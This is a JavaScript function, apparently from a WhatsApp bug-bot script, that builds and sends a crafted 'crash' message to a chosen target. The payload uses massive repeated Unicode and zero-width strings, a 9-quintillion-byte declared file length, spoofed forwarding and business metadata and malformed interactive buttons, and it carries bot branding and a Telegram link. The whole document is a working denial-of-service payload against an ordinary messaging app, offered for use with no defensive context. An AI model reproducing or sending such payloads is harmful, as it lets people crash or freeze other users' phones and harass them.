async function imgCrash(target) {
  await Yuukey.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            fromMe: false,
            stanzaId: target,
            participant: target,
            quotedMessage: {
              conversation: "҉҈𑇂𑆵𑆴𑆿".repeat(6000)
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING",
            },
            isForwarded: true, 
            forwardingScore: 250208,
            businessMessageForwardInfo: {
              businessOwnerJid: "13135550002@s.whatsapp.net"
            }
          }, 
          header: {
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQN5r3ZII4fpyrCO02rVD_ubOqMdhzExNoAxy2rT_4dJ6tJ0Y9-OK_WZ11xxgMylQOpWXQm-nC3quuooi9txtx33xRO8WSLrmwSabRXYHA?ccb=9-4&oh=01_Q5Aa2QEuMtY1rLn-CxG9dIrsjPmgV_BHIqfcuevCwxGSCBA7bQ&oe=68CA72F9&_nc_sid=e6ed6c&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "30soM43in2+ESTej4keg8SIBvljVyabjWTOxSU/Qo8M=",
              fileLength: "9000000000000000000",
              height: 640,
              width: 640,
              mediaKey: "ZF/d//7OeYxddFFNhRQ7eGBqTTh541512tSwmxbn4RY=",
              fileEncSha256: "PphwPMiHy1DHTWprrHrAfvWct6zlUIQU6mySAP7zhVQ=",
    "directPath": "/o1/v/t24/f2/m238/AQN5r3ZII4fpyrCO02rVD_ubOqMdhzExNoAxy2rT_4dJ6tJ0Y9-OK_WZ11xxgMylQOpWXQm-nC3quuooi9txtx33xRO8WSLrmwSabRXYHA?ccb=9-4&oh=01_Q5Aa2QEuMtY1rLn-CxG9dIrsjPmgV_BHIqfcuevCwxGSCBA7bQ&oe=68CA72F9&_nc_sid=e6ed6c",
              mediaKeyTimestamp: "1755515973",
              jpegThumbnail: null, 
              contextInfo: {
                fromMe: false,
                stanzaId: target,
                participant: target,
                disappearingMode: {
                  initiator: "CHANGED_IN_CHAT",
                  trigger: "CHAT_SETTING",
                }, 
                isForwarded: true, 
                forwardingScore: 999
              }
            }
          },
          body: {
            text: "The Angry Soul Come Back From Beyond The Grave"
          }, 
          footer: {
            text: "Xyraa -~"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: ""
              },              
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  "icon": "REVIEW",
                  "flow_cta": "\u200B".repeat(9000),
                  "flow_message_version": "3"
                })
              },  
            ],
            messageParamsJson: JSON.stringify({
              limited_time_offer: {
                text: "𝐊𝐢𝐥𝐥𝐞𝐫 𝐐𝐮𝐞𝐞𝐧 𝐕𝟏𝟐",
                url: "https://t.me/Raa4YouuSx",
                copy_code: "𝐗𝐲𝐫𝐚𝐚𝟒𝐒𝐱 𝐘𝐠𝐲",
                expiration_time: Date.now() * 1000
              },
              reminder_info: {
                reminder_status: "reminder_pending",
                scheduled_timestamp: Date.now() * 1000
              }
            })
          }
        }
      }
    }
  }, { participant: { jid:target }})
}